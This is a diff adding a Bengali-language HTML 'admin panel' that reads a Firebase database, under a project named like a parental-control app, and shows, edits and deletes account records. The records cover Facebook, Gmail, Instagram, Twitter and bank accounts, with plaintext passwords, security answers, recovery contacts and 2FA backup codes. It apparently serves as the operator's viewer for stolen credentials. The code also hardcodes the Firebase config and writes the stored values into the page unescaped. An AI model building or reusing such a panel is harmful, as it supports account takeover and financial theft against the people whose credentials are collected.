@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>Admin Panel - একাউন্ট ম্যানেজমেন্ট</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background: #0d0d0d;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    h2 {
+      text-align: center;
+      color: #0ff;
+      margin-bottom: 20px;
+    }
+    input[type="text"], select {
+      width: 100%;
+      max-width: 400px;
+      padding: 8px;
+      margin: 10px 0 20px 0;
+      background: #222;
+      color: #0ff;
+      border: 1px solid #0ff;
+      border-radius: 5px;
+    }
+    .scroll-x {
+      overflow-x: auto;
+      max-width: 100%;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      min-width: 1700px;
+      font-size: 14px;
+      background: #1a1a1a;
+      white-space: nowrap;
+    }
+    th, td {
+      border: 1px solid #444;
+      padding: 8px 10px;
+      text-align: left;
+    }
+    th {
+      background: #00ffff;
+      color: #000;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    tr:nth-child(even) {
+      background-color: #2a2a2a;
+    }
+    button {
+      background-color: #00ffff;
+      color: #000;
+      padding: 5px 10px;
+      border: none;
+      margin: 2px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #status {
+      text-align: center;
+      margin-top: 10px;
+      color: lightgreen;
+    }
+    /* Edit Modal */
+    #editModal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+      padding: 30px;
+      overflow: auto;
+    }
+    #editModal div {
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 800px;
+      margin: auto;
+    }
+    #editModal input {
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 8px;
+      background: #222;
+      color: #0ff;
+      border: 1px solid #0ff;
+      border-radius: 4px;
+    }
+    #editModal label {
+      font-weight: bold;
+      display: block;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>📋 Admin Panel - একাউন্ট তালিকা</h2>
+
+  <input type="text" id="searchInput" placeholder="🔍 সার্চ করুন (নাম, ইমেইল, ফোন)" onkeyup="searchTable()" />
+
+  <label for="filter">অ্যাকাউন্ট টাইপ ফিল্টার:</label>
+  <select id="filter" onchange="loadData()">
+    <option value="">সব</option>
+    <option value="Facebook">Facebook</option>
+    <option value="Gmail">Gmail</option>
+    <option value="Instagram">Instagram</option>
+    <option value="Bank">Bank</option>
+    <option value="Twitter">Twitter</option>
+    <option value="Other">Other</option>
+  </select>
+
+  <div class="scroll-x">
+    <table id="dataTable">
+      <thead>
+        <tr>
+          <th>টাইপ</th>
+          <th>পুরো নাম</th>
+          <th>ইউজারনেম</th>
+          <th>ইমেইল</th>
+          <th>ফোন</th>
+          <th>পাসওয়ার্ড</th>
+          <th>রিকভারি ইমেইল</th>
+          <th>রিকভারি ফোন</th>
+          <th>নিরাপত্তা প্রশ্ন</th>
+          <th>উত্তর</th>
+          <th>2FA</th>
+          <th>তারিখ</th>
+          <th>ব্যাকআপ কোড</th>
+          <th>মন্তব্য</th>
+          <th>অপশন</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </div>
+
+  <div id="status"></div>
+
+  <!-- Edit Modal -->
+  <div id="editModal">
+    <div>
+      <h3>🔧 একাউন্ট এডিট করুন</h3>
+      <div id="editForm"></div>
+      <button onclick="saveEdit()" style="background:#0f0;color:#000;">💾 Save</button>
+      <button onclick="closeModal()" style="background:#f00;color:#fff;">❌ Cancel</button>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyD9nzYpJHHMLIyd0K9znpKyIJuetTZMQ_M",
+      authDomain: "prent-control-kids.firebaseapp.com",
+      databaseURL: "https://prent-control-kids-default-rtdb.firebaseio.com",
+      projectId: "prent-control-kids",
+      storageBucket: "prent-control-kids.appspot.com",
+      messagingSenderId: "464071311395",
+      appId: "1:464071311395:web:24380235dcaac3f04ef196"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentEditId = null;
+
+    function loadData() {
+      const filter = document.getElementById("filter").value;
+      const tbody = document.querySelector("#dataTable tbody");
+      tbody.innerHTML = "";
+
+      db.ref("accounts").once("value", snapshot => {
+        const data = snapshot.val();
+        if (!data) {
+          tbody.innerHTML = "<tr><td colspan='15'>কোনো তথ্য পাওয়া যায়নি।</td></tr>";
+          return;
+        }
+
+        Object.keys(data).forEach(key => {
+          const acc = data[key];
+          if (filter && acc.accountType !== filter) return;
+
+          const row = document.createElement("tr");
+          row.innerHTML = `
+            <td>${acc.accountType || ""}</td>
+            <td>${acc.fullName || ""}</td>
+            <td>${acc.username || ""}</td>
+            <td>${acc.email || ""}</td>
+            <td>${acc.phone || ""}</td>
+            <td>${acc.password || ""}</td>
+            <td>${acc.recoveryEmail || ""}</td>
+            <td>${acc.recoveryPhone || ""}</td>
+            <td>${acc.securityQuestion || ""}</td>
+            <td>${acc.securityAnswer || ""}</td>
+            <td>${acc.twoFactorEnabled || ""}</td>
+            <td>${acc.creationDate || ""}</td>
+            <td>${acc.backupCodes || ""}</td>
+            <td>${acc.note || ""}</td>
+            <td>
+              <button onclick="editItem('${key}')">✏️ Edit</button>
+              <button onclick="deleteItem('${key}')">🗑️ Delete</button>
+            </td>
+          `;
+          tbody.appendChild(row);
+        });
+      });
+    }
+
+    function deleteItem(id) {
+      if (confirm("আপনি কি ডিলিট করতে চান?")) {
+        db.ref("accounts/" + id).remove().then(() => {
+          document.getElementById("status").innerText = "✅ ডিলিট সফল হয়েছে।";
+          loadData();
+        }).catch(() => {
+          document.getElementById("status").innerText = "❌ ডিলিট ব্যর্থ হয়েছে।";
+        });
+      }
+    }
+
+    function editItem(id) {
+      currentEditId = id;
+      db.ref("accounts/" + id).once("value", snap => {
+        const acc = snap.val();
+        let html = "";
+        // List all keys you want editable, to control order and fields
+        const fields = [
+          { key: "accountType", label: "অ্যাকাউন্ট টাইপ" },
+          { key: "fullName", label: "পুরো নাম" },
+          { key: "username", label: "ইউজারনেম" },
+          { key: "email", label: "ইমেইল" },
+          { key: "phone", label: "ফোন" },
+          { key: "password", label: "পাসওয়ার্ড" },
+          { key: "recoveryEmail", label: "রিকভারি ইমেইল" },
+          { key: "recoveryPhone", label: "রিকভারি ফোন" },
+          { key: "securityQuestion", label: "নিরাপত্তা প্রশ্ন" },
+          { key: "securityAnswer", label: "প্রশ্নের উত্তর" },
+          { key: "twoFactorEnabled", label: "2FA" },
+          { key: "creationDate", label: "তারিখ" },
+          { key: "backupCodes", label: "ব্যাকআপ কোড" },
+          { key: "note", label: "মন্তব্য" }
+        ];
+        fields.forEach(f => {
+          html += `<label>${f.label}</label><input type="text" id="edit_${f.key}" value="${acc[f.key] || ""}">`;
+        });
+        document.getElementById("editForm").innerHTML = html;
+        document.getElementById("editModal").style.display = "block";
+      });
+    }
+
+    function saveEdit() {
+      const inputs = document.querySelectorAll("#editForm input");
+      const updatedData = {};
+      inputs.forEach(input => {
+        const field = input.id.replace("edit_", "");
+        updatedData[field] = input.value;
+      });
+      db.ref("accounts/" + currentEditId).update(updatedData).then(() => {
+        document.getElementById("status").innerText = "✅ সফলভাবে আপডেট হয়েছে!";
+        closeModal();
+        loadData();
+      });
+    }
+
+    function closeModal() {
+      document.getElementById("editModal").style.display = "none";
+    }
+
+    function searchTable() {
+      const input = document.getElementById("searchInput").value.toLowerCase();
+      const rows = document.querySelectorAll("#dataTable tbody tr");
+      rows.forEach(row => {
+        const text = row.innerText.toLowerCase();
+        row.style.display = text.includes(input) ? "" : "none";
+      });
+    }
+
+    window.onload = loadData;
+  </script>
+</body>
+</html>
